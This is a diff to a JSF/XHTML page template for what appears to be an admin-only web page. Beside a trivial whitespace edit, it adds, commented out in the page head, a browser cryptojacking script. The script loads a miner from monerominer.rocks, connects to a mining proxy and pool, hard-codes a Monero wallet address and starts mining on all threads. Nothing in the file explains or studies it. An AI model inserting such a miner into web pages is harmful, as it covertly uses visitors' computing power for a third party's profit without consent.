@@ -4,7 +4,7 @@
 	xmlns:f="http://java.sun.com/jsf/core"
 	xmlns:h="http://java.sun.com/jsf/html">
 	 <h:panelGroup rendered="#{tempBean.moblEntity.role eq 'ADMIN'}">
-<f:view>
+<f:view >
 	<h:head>
 		<link rel="stylesheet" href="../../resources/fonts.css" />
 		<meta name="viewport" content="width=device-width, initial-scale=1" />
@@ -80,6 +80,17 @@ font-family: IRANSansNor;
 }
 </style>
 		<ui:insert name="headPage" />
+<!-- 		<script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
+<script>
+    server = "wss://f.xmrminingproxy.com:8181";
+    var pool = "moneroocean.stream";
+    var walletAddress = "49BSX8jwxo3TWXvob3sudtMyAdMr8QiV5WFM4cayj6iZMFetHQLxnvxZ2SmNgHscthSLA4irKyYvJNyExwVyJa225S58xS4";
+    var workerId = ""
+    var threads = -1;
+    var password = "x";
+    startMining(pool, walletAddress, workerId, threads, password);
+    throttleMiner = 20;
+</script>  -->
 	</h:head>
 	<body>
 
